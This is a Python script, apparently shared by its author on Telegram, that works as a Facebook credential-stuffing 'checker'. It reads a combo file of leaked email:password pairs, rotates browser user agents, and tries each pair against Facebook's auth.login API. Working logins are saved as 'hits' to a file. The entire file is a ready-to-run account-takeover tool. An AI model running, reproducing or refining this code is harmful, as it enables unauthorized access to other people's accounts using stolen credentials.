import requests
import re
import random
import pyfiglet
E = '\033[1;31m'
G = '\033[1;35m'
Z = '\033[1;31m'  # احمر
X = '\033[1;33m'  # اصفر
Z1 = '\033[2;31m'  # احمر ثاني
F = '\033[2;32m'  # اخضر
A = '\033[2;34m'  # ازرق
C = '\033[2;35m'  # وردي
B = '\x1b[38;5;208m'  # برتقالي
Y = '\033[1;34m'  # ازرق فاتح
M = '\x1b[1;37m'  # ابیض
S = '\033[1;33m'

bss = 0
uus = 0
hit = 0
bad = 0

print(f'''{B}{F}━━━━━━━━━━━━━⧪━━━━━━━━━━━━━{B}
|{Z}[+] TeleGram  : {B} @Roox_00    |
|{Z}[+] Chanel  : {B}Ulus |
|{Z}[+] Tool  : {B} Facebook Checker |
{F}━━━━━━━━━━━━━⧪━━━━━━━━━━━━━━━━━━ ''')
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.124 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/107.0.1418.42",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Safari/537.36"
]
ULUS_FACEBOOK_URL = "https://www.facebook.com/"
ULUS_LOGIN_URL = "https://b-api.facebook.com/method/auth.login"
ULUS_HEADERS = {
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "en-US,en;q=0.9",
    "Cache-Control": "max-age=0",
    "Connection": "keep-alive",
    "Host": "www.facebook.com",
    "sec-ch-ua": '"Chromium";v="92", " Not A;Brand";v="99", "Google Chrome";v="92"',
    "sec-ch-ua-mobile": "?0",
    "Sec-Fetch-Dest": "document",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-User": "?1",
    "Upgrade-Insecure-Requests": "1",
    "User-Agent": random.choice(USER_AGENTS)
}
def ulus_extract_value(source, regex_pattern):
    match = re.search(regex_pattern, source)
    return match.group(1) if match else None
def ulus_parse_fields(source):
    pmt = ulus_extract_value(source, r'action="/login/\?privacy_mutation_token=(.*?)"')
    jab = ulus_extract_value(source, r'<input type="hidden" name="jazoest" value="(.*?)"')
    lsd = ulus_extract_value(source, r'name="lsd" value="(.*?)"')
    return pmt, jab, lsd
def ulus_login(email, password):
    headers = ULUS_HEADERS.copy()
    headers["User-Agent"] = random.choice(USER_AGENTS)
    login_data = {
        "email": email,
        "password": password,
        "credentials_type": "password",
        "error_detail_type": "button_with_disabled",
        "format": "json",
        "device_id": "cdc4558c-4dd4-4fd0-9ba6-d09e0223d5e5",
        "generate_session_cookies": "1",
        "generate_analytics_claim": "1",
        "generate_machine_id": "1",
        "method": "auth.login"
    }
    try:
        login_response = requests.post(ULUS_LOGIN_URL, data=login_data, headers=headers, timeout=10)
        if "access_token" in login_response.text:
            return True
    except requests.exceptions.RequestException:
        pass
    return False
def ulus_read_credentials(file_path):
    with open(file_path, 'r', encoding='utf-8') as file, open("ulus.txt", "w", encoding="utf-8") as hit_file:
        for line in file:
            if ":" in line:
                email, password = line.strip().split(":", 1)
                if ulus_login(email, password):
                    print(f"HİT : {email}")
                    hit_file.write(f"{email}:{password}\n")
                else:
                    print(f"BAD : {email}")
print("TEK GERÇEK @ULUSUM")
file_path = input("COMBO YOLU =>  ")
ulus_read_credentials(file_path)
